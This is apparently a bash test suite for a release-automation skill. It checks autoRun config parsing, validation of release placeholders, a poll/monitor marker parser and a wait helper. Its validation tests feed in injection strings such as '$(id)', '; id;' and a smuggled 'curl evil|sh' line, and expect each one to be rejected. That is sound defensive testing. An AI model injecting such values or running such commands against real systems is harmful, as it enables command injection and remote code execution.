#!/usr/bin/env bash
# N1-301: release.autoRun strict boolean, placeholder validation, (poll:)/(monitor:) parser and wait helper, wiring.
set -uo pipefail
cd "$(dirname "$0")/.."
FAIL=0
R2=skills/n1-release/steps/02-confirm-execute.md

expect() { # <label> <want> <got>
    if [ "$3" = "$2" ]; then echo "PASS: $1"; else echo "FAIL: $1 (want $2, got '$3')"; FAIL=1; fi
}
check() { # <label> <fixed-string> <file>
    if grep -qF -- "$2" "$3" 2>/dev/null; then echo "PASS: $1"; else echo "FAIL: $1"; FAIL=1; fi
}
absent() { # <label> <fixed-string> <file>
    if grep -qF -- "$2" "$3" 2>/dev/null; then echo "FAIL: $1"; FAIL=1; else echo "PASS: $1"; fi
}
before() { # <label> <fixed-a> <fixed-b> <file>: first occurrence of a precedes first occurrence of b
    local a b
    a=$(grep -nF -m1 -- "$2" "$4" 2>/dev/null | cut -d: -f1); b=$(grep -nF -m1 -- "$3" "$4" 2>/dev/null | cut -d: -f1)
    if [ -n "$a" ] && [ -n "$b" ] && [ "$a" -lt "$b" ]; then echo "PASS: $1"; else echo "FAIL: $1"; FAIL=1; fi
}
first() { printf '%s' "${1%%$'\n'*}"; }
last() { printf '%s' "${1##*$'\n'}"; }

T=$(mktemp -d); trap 'rm -rf "$T"' EXIT

# --- n1_release_autorun_enabled: JSON boolean true only
autorun() { # <config-json | -> ; "-" = no config file
    rm -rf "$T/h"; mkdir -p "$T/h"
    [ "$1" = - ] || printf '%s' "$1" > "$T/h/config.json"
    N1_HOME="$T/h" bash -c 'source lib/validation.sh; n1_release_autorun_enabled'
}
expect "autoRun JSON true -> true" true "$(autorun '{"release":{"autoRun":true}}')"
expect "autoRun string \"true\" -> false" false "$(autorun '{"release":{"autoRun":"true"}}')"
expect "autoRun 1 -> false" false "$(autorun '{"release":{"autoRun":1}}')"
expect "autoRun false -> false" false "$(autorun '{"release":{"autoRun":false}}')"
expect "autoRun absent -> false" false "$(autorun '{"release":{}}')"
expect "release not an object -> false" false "$(autorun '{"release":"x"}')"
expect "no config file -> false" false "$(autorun -)"

# --- n1_release_vars_valid: 4 stdin lines VERSION, TICKET_ID, MERGE_SHA, TAG
vars() { # <input> -> "rc=<n> <first output line up to the colon>"
    local out rc
    out=$(bash -c 'source lib/validation.sh; n1_release_vars_valid' <<<"$1"); rc=$?
    printf 'rc=%s %s' "$rc" "${out%%:*}"
}
expect "plain values pass" "rc=0 " "$(vars $'1.2.3\nPROJ-12\nabc1234\nv1.2.3')"
expect "prerelease+build, empty ticket and sha pass" "rc=0 " "$(vars $'1.2.3-rc.1+build.5\n\n\nv1.2.3-rc.1+build.5')"
expect "underscore project key passes (Jira allows it)" "rc=0 " "$(vars $'1.2.3\nMY_PROJ2-7\n\nv1.2.3')"
expect "full 40-hex sha passes" "rc=0 " "$(vars $'2.0.0\nN1-301\n0123456789abcdef0123456789abcdef01234567\nv2.0.0')"
expect "quote/semicolon injection in VERSION" "rc=1 invalid VERSION" "$(vars $'1.0.0"; id; "\nPROJ-1\nabc1234\nv1.0.0"; id; "')"
expect "command substitution in VERSION" "rc=1 invalid VERSION" "$(vars $'$(id)\n\n\nv$(id)')"
expect "leading space in VERSION" "rc=1 invalid VERSION" "$(vars $' 1.2.3\n\n\nv 1.2.3')"
expect "v-prefixed VERSION" "rc=1 invalid VERSION" "$(vars $'v1.2.3\n\n\nvv1.2.3')"
expect "empty VERSION" "rc=1 invalid VERSION" "$(vars $'\n\n\nv')"
expect "bad TICKET_ID" "rc=1 invalid TICKET_ID" "$(vars $'1.2.3\nPROJ-1;id\n\nv1.2.3')"
expect "non-hex MERGE_SHA" "rc=1 invalid MERGE_SHA" "$(vars $'1.2.3\n\nxyz1234\nv1.2.3')"
expect "uppercase MERGE_SHA" "rc=1 invalid MERGE_SHA" "$(vars $'1.2.3\n\nABC1234\nv1.2.3')"
expect "short MERGE_SHA" "rc=1 invalid MERGE_SHA" "$(vars $'1.2.3\n\nabc12\nv1.2.3')"
expect "TAG differs from v+VERSION" "rc=1 invalid TAG" "$(vars $'1.2.3\n\n\nv1.2.4')"
expect "missing TAG line" "rc=1 invalid TAG" "$(vars $'1.2.3\nPROJ-1\nabc1234')"
expect "newline-smuggled extra line" "rc=1 invalid input" "$(vars $'1.2.3\nPROJ-1\nabc1234\nv1.2.3\ncurl evil|sh')"

# --- n1_wait_parse_marker
marker() { bash -c 'source lib/poll.sh; n1_wait_parse_marker "$@"' _ "$@"; }
TB=$'\t'
expect "poll 10m, default interval" "poll${TB}600${TB}15" "$(marker false 'Wait for npm: `npm view x@1.2.3 version` (poll: 10m)')"
expect "monitor 10m every 30s" "monitor${TB}600${TB}30" "$(marker false '(monitor: 10m, every 30s) Watch: `curl -f https://e.x/healthz`')"
expect "units s and h" "poll${TB}3600${TB}45" "$(marker true 'x (poll: 1h, every 45s) y')"
expect "marker mid-text" "poll${TB}90${TB}15" "$(marker false 'run `a` (poll: 90s) then continue')"
expect "both markers -> reject" reject "$(marker false '(poll: 10m) and (monitor: 5m)')"
expect "same marker twice -> reject" reject "$(marker false '(poll: 10m) (poll: 5m)')"
expect "malformed duration -> reject" reject "$(marker false '(poll: soon)')"
expect "zero duration -> reject" reject "$(marker false '(poll: 0m)')"
expect "unknown unit -> reject" reject "$(marker false '(monitor: 10d)')"
expect "zero interval -> reject" reject "$(marker false '(poll: 10m, every 0s)')"
expect "uppercase opener -> reject" reject "$(marker false '(POLL: 10m)')"
expect "phrase with autoRun -> 10m poll" "poll${TB}600${TB}15" "$(marker true 'Check: `npm view x` Retry until it passes.')"
expect "phrase is case-insensitive" "poll${TB}600${TB}15" "$(marker true 'Check: `npm view x` retry until it PASSES')"
expect "phrase without autoRun -> none" none "$(marker false 'Check: `npm view x` Retry until it passes.')"
expect "explicit marker beats the phrase" "monitor${TB}120${TB}15" "$(marker true 'Retry until it passes (monitor: 2m)')"
expect "no marker -> none" none "$(marker true 'Build: `npm run build`')"

# --- n1_wait_step with a fake clock: sleep advances $CLOCK_OFF, date +%s reads real time plus the offset
mkdir -p "$T/bin"
printf '#!/usr/bin/env bash\necho $(( $(cat "$CLOCK_OFF" 2>/dev/null || echo 0) + ${1%%.*} )) > "$CLOCK_OFF"\n' > "$T/bin/sleep"
printf '#!/usr/bin/env bash\necho $(( $(/bin/date +%%s) + $(cat "$CLOCK_OFF" 2>/dev/null || echo 0) ))\n' > "$T/bin/date"
chmod +x "$T/bin/sleep" "$T/bin/date"
export CLOCK_OFF="$T/off" CHECKS="$T/checks"
COUNT='n=$(( $(cat "$CHECKS" 2>/dev/null || echo 0) + 1 )); echo "$n" > "$CHECKS"; echo "check $n"'
fresh() { rm -f "$T/off" "$CHECKS"; }
ws() { # <mode> <remaining> <interval> <command> -> helper stdout, then "rc=<n>" as the last line
    PATH="$T/bin:$PATH" bash -c 'source lib/poll.sh; n1_wait_step "$@"; echo "rc=$?"' _ "$@"
}
in_range() { # <label> <token "pending N"> <lo> <hi>
    local n="${2#pending }"
    if [[ "$n" =~ ^[0-9]+$ ]] && [ "$n" -ge "$3" ] && [ "$n" -le "$4" ]; then echo "PASS: $1"; else echo "FAIL: $1 (got '$2')"; FAIL=1; fi
}

fresh; out=$(ws poll 600 15 "$COUNT; [ \$n -gt 3 ]")
expect "poll: 3 failures then pass -> passed" passed "$(first "$out")"
expect "poll: passed exits 0" rc=0 "$(last "$out")"
expect "poll: stops at the first passing check" 4 "$(cat "$CHECKS")"
check "poll: passed prints the last check output" "check 4" <(printf '%s\n' "$out")

fresh; out=$(ws poll 300 15 "$COUNT; echo not yet; exit 1")
expect "poll: never passes -> timeout" timeout "$(first "$out")"
expect "poll: timeout exits 1" rc=1 "$(last "$out")"
check "poll: timeout prints the last output" "not yet" <(printf '%s\n' "$out")

fresh; out=$(ws poll 900 15 "$COUNT; [ \$n -gt 40 ]")
in_range "poll: budget over one chunk -> pending with the remaining seconds" "$(first "$out")" 415 420
expect "poll: pending exits 0" rc=0 "$(last "$out")"
out=$(ws poll "$(first "$out" | cut -d' ' -f2)" 15 "$COUNT; [ \$n -gt 40 ]")
expect "poll: second chunk completes -> passed" passed "$(first "$out")"

fresh; out=$(ws monitor 600 30 "$COUNT")
in_range "monitor: 10m window first chunk -> pending" "$(first "$out")" 115 120
out=$(ws monitor "$(first "$out" | cut -d' ' -f2)" 30 "$COUNT")
expect "monitor: full window of exit-0 checks -> ok" ok "$(first "$out")"
expect "monitor: ok exits 0" rc=0 "$(last "$out")"

fresh; out=$(ws monitor 600 30 "$COUNT; [ \$n -lt 3 ] || { echo boom; exit 1; }")
expect "monitor: first failing check -> failed" failed "$(first "$out")"
expect "monitor: failed exits 1" rc=1 "$(last "$out")"
expect "monitor: stops at the failing check" 3 "$(cat "$CHECKS")"
check "monitor: failed prints the check output" "boom" <(printf '%s\n' "$out")

fresh; out=$(ws monitor 900 15 "$COUNT; [ \$n -le 40 ] || { echo late boom; exit 1; }")
in_range "monitor: first chunk all green -> pending" "$(first "$out")" 415 420
out=$(ws monitor "$(first "$out" | cut -d' ' -f2)" 15 "$COUNT; [ \$n -le 40 ] || { echo late boom; exit 1; }")
expect "monitor: failure in the second chunk -> failed at once" failed "$(first "$out")"
expect "monitor: second-chunk failure stops at that check" 41 "$(cat "$CHECKS")"

fresh; export N1_WAIT_CHECK_TIMEOUT=1
out=$(ws poll 30 15 '/bin/sleep 5')
unset N1_WAIT_CHECK_TIMEOUT
expect "hung check is cut and counted as failed -> timeout" timeout "$(first "$out")"
check "hung check output names the per-check timeout" "check timed out after 1s" <(printf '%s\n' "$out")

out=$(ws poll 10m 15 true)
expect "non-integer remaining -> failed" failed "$(first "$out")"
expect "bad arguments exit 1" rc=1 "$(last "$out")"
check "bad arguments print usage" "usage: n1_wait_step" <(printf '%s\n' "$out")
expect "unknown mode -> failed" failed "$(first "$(ws sleep 600 15 true)")"
expect "empty command -> failed" failed "$(first "$(ws poll 600 15 '')")"

# --- wiring: 02-confirm-execute.md
check "gate stays unconditional" '**This gate is unconditional.**' "$R2"
absent "02 never reads autonomy settings" 'n1_autonomy_val' "$R2"
before "AUTORUN is read at the gate, before the walk" 'n1_release_autorun_enabled' '**Walk each step**' "$R2"
check "gate discloses shell steps that run unprompted" 'Shell steps that will run without prompts (' "$R2"
check "gate Release line mentions autoRun creation" 'or it is created automatically when release.autoRun is true' "$R2"
before "placeholders validated before substitution" 'n1_release_vars_valid' '`{{RELEASE_TAG}}` -> `TAG` value' "$R2"
check "validation failure stops before any command" 'no procedure command ran' "$R2"
check "walk classifies markers" 'n1_wait_parse_marker' "$R2"
check "walk runs the wait helper" 'n1_wait_step <poll|monitor> <remaining-s> <interval-s> "$CMD"' "$R2"
check "wait helper is never backgrounded" 'Never background it' "$R2"
check "wait helper uses the maximum command timeout" 'maximum command timeout (600000 ms)' "$R2"
check "marker without a command stays manual" 'including a step with a `(poll:)`/`(monitor:)` marker but no command' "$R2"
check "missing-offer names autoRun as the only skip" 'only release.autoRun skips this ask' "$R2"
absent "old missing-offer wording removed" 'no autonomy setting skips this ask' "$R2"
check "missing-offer auto-creates under autoRun" 'When `AUTORUN` (Step 3) is `true`, do not ask' "$R2"

exit $FAIL
